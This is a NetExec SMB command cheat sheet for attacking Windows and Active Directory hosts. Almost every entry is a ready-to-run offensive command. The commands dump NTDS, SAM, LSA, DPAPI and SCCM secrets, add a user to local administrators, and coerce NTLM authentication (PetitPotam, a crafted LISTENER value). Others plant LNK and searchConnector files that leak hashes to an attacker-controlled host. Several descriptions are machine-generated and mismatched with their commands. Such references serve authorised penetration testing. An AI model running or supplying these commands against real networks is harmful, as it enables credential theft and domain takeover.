# NetExec SMB

## nxc smb

### SMB Coercion

Trigger SMB coercion with NetExec SMB.

```sh title:"NetExec SMB Trigger SMB Coercion"
nxc smb $domain -u $user $auth_flags -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### generate-tgt - alternative to impacket getTGT

Generate TGT alternative to impacket getTGT with NetExec SMB.

```sh title:"NetExec SMB Generate TGT Alternative to Impacket GetTGT"
nxc smb $domain -u $user $auth_flags -k --generate-tgt ./$ccache_file_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var ccache_file_name
-->

### Timeroast

Extract timeroast with NetExec SMB.

```sh title:"NetExec SMB Extract Timeroast"
nxc smb $domain -u $user $auth_flags -M timeroast
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get user shares

List user shares with NetExec SMB.

```sh title:"NetExec SMB List User Shares"
nxc smb $domain -u $user $auth_flags --shares
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### List folders in a share

List folders in a share with NetExec SMB.

```sh title:"NetExec SMB List Folders in a Share"
nxc smb $domain -u $user $auth_flags --share $share_name --dir
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### List files in a share folder

List files in a share folder with NetExec SMB.

```sh title:"NetExec SMB List Files in a Share Folder"
nxc smb $domain -u $user $auth_flags --share $share_name --dir $folder_path
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var folder_path
-->

### get file from share

List file from share with NetExec SMB.

```sh title:"NetExec SMB List File from Share"
nxc smb $domain -u $user $auth_flags --share $share_name --get-file $file $file
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var file
-->

### Dump NTDS

Dump NTDS with NetExec SMB.

```sh title:"NetExec SMB Dump NTDS"
nxc smb $domain -u $user $auth_flags --ntds
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get user SIDs via SMB

List user SIDs via SMB with NetExec SMB.

```sh title:"NetExec SMB List User SIDs Via SMB"
nxc smb $domain -u $user $auth_flags --rid-brute 3000 | grep SidTypeUser | awk {'print $6'}
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Add user to local admin group

Add user to local admin group with NetExec SMB.

```sh title:"NetExec SMB Add User to Local Admin Group"
nxc smb $domain -u $user $auth_flags -x 'net localgroup administrators $domain_user /add'
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Coerce authentication via PetitPotam

Trigger authentication via PetitPotam with NetExec SMB.

```sh title:"NetExec SMB Trigger Authentication Via PetitPotam"
nxc smb $domain -u $user $auth_flags -M coerce_plus -o LISTENER=$lhost METHOD=PetitPotam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### password policys

Dump password policys with NetExec SMB.

```sh title:"NetExec SMB Dump Password Policys"
nxc smb $domain -u $user $auth_flags --pass-pol
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get Group Policy Preference AutoLogon

List group policy preference AutoLogon with NetExec SMB.

```sh title:"NetExec SMB List Group Policy Preference AutoLogon"
nxc smb $domain -u $user $auth_flags -M gpp_autologin
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get Group Policy Preference Password

List group policy preference password with NetExec SMB.

```sh title:"NetExec SMB List Group Policy Preference Password"
nxc smb $domain -u $user $auth_flags -M gpp_password
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Logged on users

Run logged on users with NetExec SMB.

```sh title:"NetExec SMB Run Logged on Users"
nxc smb $domain -u $user $auth_flags --loggedon-users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Spider shares

Run spider shares with NetExec SMB.

```sh title:"NetExec SMB Run Spider Shares"
nxc smb $domain -u $user $auth_flags -M spider_plus --share $share_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### Network connections (IPs/FQDN)

Find network connections (IPs/FQDN) with NetExec SMB.

```sh title:"NetExec SMB Find Network Connections (IPs/FQDN)"
nxc smb $domain -u $user $auth_flags -M get_netconnections
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### slinky LNK NTLM Theft

List slinky LNK NTLM theft with NetExec SMB.

```sh title:"NetExec SMB List Slinky LNK NTLM Theft"
nxc smb $domain -u $user $auth_flags -M slinky -o SERVER=$lhost NAME=$lnk_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
import tun_ip
var lnk_name
-->

### ntlm replay list

List NTLM replay list with NetExec SMB.

```sh title:"NetExec SMB List NTLM Replay List"
nxc smb $domain -u $user $auth_flags --gen-relay-list relay.txt
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### .searchConnector-ms and .library-ms files NTLM Theft

Find .searchConnector ms and .library ms files NTLM theft with NetExec SMB.

```sh title:"NetExec SMB Find .searchConnector Ms and .library Ms Files NTLM Theft"
nxc smb $domain -u $user $auth_flags -M drop-sc -o URL=\\\\$lhost\\secret SHARE=$share_name FILENAME=secret
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### Backup Operators hive dump

Dump backup operators hive dump with NetExec SMB.

```sh title:"NetExec SMB Dump Backup Operators Hive Dump"
nxc smb $domain -u $user $auth_flags -M backup_operator
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Remote qwinsta

Show remote qwinsta with NetExec SMB.

```sh title:"NetExec SMB Show Remote Qwinsta"
nxc smb $domain -u $user $auth_flags --qwinsta
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump SAM

Dump SAM with NetExec SMB.

```sh title:"NetExec SMB Dump SAM"
nxc smb $domain -u $user $auth_flags --sam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump LSA secrets

Dump LSA secrets with NetExec SMB.

```sh title:"NetExec SMB Dump LSA Secrets"
nxc smb $domain -u $user $auth_flags --lsa
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS via VSS

Dump NTDS via VSS with NetExec SMB.

```sh title:"NetExec SMB Dump NTDS Via VSS"
nxc smb $domain -u $user $auth_flags --ntds vss
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS with history

Dump NTDS with history with NetExec SMB.

```sh title:"NetExec SMB Dump NTDS with History"
nxc smb $domain -u $user $auth_flags --ntds --history
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS with Kerberos keys

Dump NTDS with kerberos keys with NetExec SMB.

```sh title:"NetExec SMB Dump NTDS with Kerberos Keys"
nxc smb $domain -u $user $auth_flags --ntds --kerberos-keys
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS enabled only

Dump NTDS enabled only with NetExec SMB.

```sh title:"NetExec SMB Dump NTDS Enabled Only"
nxc smb $domain -u $user $auth_flags --ntds --enabled
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS one user

Dump NTDS one user with NetExec SMB.

```sh title:"NetExec SMB Dump NTDS One User"
nxc smb $domain -u $user $auth_flags --ntds --user $target_user
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
-->

### Dump DPAPI

Dump DPAPI with NetExec SMB.

```sh title:"NetExec SMB Dump DPAPI"
nxc smb $domain -u $user $auth_flags --dpapi
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump SCCM secrets

Dump SCCM secrets with NetExec SMB.

```sh title:"NetExec SMB Dump SCCM Secrets"
nxc smb $domain -u $user $auth_flags --sccm
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### List VSS snapshots

List VSS snapshots with NetExec SMB.

```sh title:"NetExec SMB List VSS Snapshots"
nxc smb $domain -u $user $auth_flags --list-snapshots
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Filter shares by access

Enumerate filter shares by access with NetExec SMB.

```sh title:"NetExec SMB Enumerate Filter Shares by Access"
nxc smb $domain -u $user $auth_flags --shares --filter-shares READ,WRITE
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Exclude shares

Enumerate exclude shares with NetExec SMB.

```sh title:"NetExec SMB Enumerate Exclude Shares"
nxc smb $domain -u $user $auth_flags --shares --exclude-shares C$ ADMIN$ IPC$
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Skip share write check

Check skip share write check with NetExec SMB.

```sh title:"NetExec SMB Check Skip Share Write Check"
nxc smb $domain -u $user $auth_flags --shares --no-write-check
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### List path content

List path content with NetExec SMB.

```sh title:"NetExec SMB List Path Content"
nxc smb $domain -u $user $auth_flags --dir $folder_path
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var folder_path
-->

### Network interfaces

Enumerate network interfaces with NetExec SMB.

```sh title:"NetExec SMB Enumerate Network Interfaces"
nxc smb $domain -u $user $auth_flags --interfaces
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Disks

Enumerate disks with NetExec SMB.

```sh title:"NetExec SMB Enumerate Disks"
nxc smb $domain -u $user $auth_flags --disks
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Domain users (SMB)

Enumerate domain users (SMB) with NetExec SMB.

```sh title:"NetExec SMB Enumerate Domain Users (SMB)"
nxc smb $domain -u $user $auth_flags --users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Domain groups (SMB)

Enumerate domain groups (SMB) with NetExec SMB.

```sh title:"NetExec SMB Enumerate Domain Groups (SMB)"
nxc smb $domain -u $user $auth_flags --groups
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Local groups

Enumerate local groups with NetExec SMB.

```sh title:"NetExec SMB Enumerate Local Groups"
nxc smb $domain -u $user $auth_flags --local-groups
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Computers (SMB)

Enumerate computers (SMB) with NetExec SMB.

```sh title:"NetExec SMB Enumerate Computers (SMB)"
nxc smb $domain -u $user $auth_flags --computers
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### SMB sessions

Run SMB sessions with NetExec SMB.

```sh title:"NetExec SMB Run SMB Sessions"
nxc smb $domain -u $user $auth_flags --smb-sessions
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Registry sessions

Enumerate registry sessions with NetExec SMB.

```sh title:"NetExec SMB Enumerate Registry Sessions"
nxc smb $domain -u $user $auth_flags --reg-sessions
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Logged-on user filter

Run logged on user filter with NetExec SMB.

```sh title:"NetExec SMB Run Logged on User Filter"
nxc smb $domain -u $user $auth_flags --loggedon-users-filter $regex
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var regex
-->

### Process list

List process list with NetExec SMB.

```sh title:"NetExec SMB List Process List"
nxc smb $domain -u $user $auth_flags --tasklist
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Kill process

Run kill process with NetExec SMB.

```sh title:"NetExec SMB Run Kill Process"
nxc smb $domain -u $user $auth_flags --taskkill $proc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var proc
-->

### WMI query

Enumerate WMI query with NetExec SMB.

```sh title:"NetExec SMB Enumerate WMI Query"
nxc smb $domain -u $user $auth_flags --wmi-query "$wmi_query" --wmi-namespace 'root\cimv2'
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var wmi_query
-->

### Spider share

Run spider share with NetExec SMB.

```sh title:"NetExec SMB Run Spider Share"
nxc smb $domain -u $user $auth_flags --spider $share_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### Spider with pattern

Run spider with pattern with NetExec SMB.

```sh title:"NetExec SMB Run Spider with Pattern"
nxc smb $domain -u $user $auth_flags --spider $share_name --content --pattern $pattern --depth $depth
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var pattern
var depth
-->

### Spider with regex

Run spider with regex with NetExec SMB.

```sh title:"NetExec SMB Run Spider with Regex"
nxc smb $domain -u $user $auth_flags --spider $share_name --content --regex $regex --depth $depth
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var regex
var depth
-->

### Put file to share

Enumerate put file to share with NetExec SMB.

```sh title:"NetExec SMB Enumerate Put File to Share"
nxc smb $domain -u $user $auth_flags --put-file $local_file_path $remote_file_path
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var local_file_path
var remote_file_path
-->

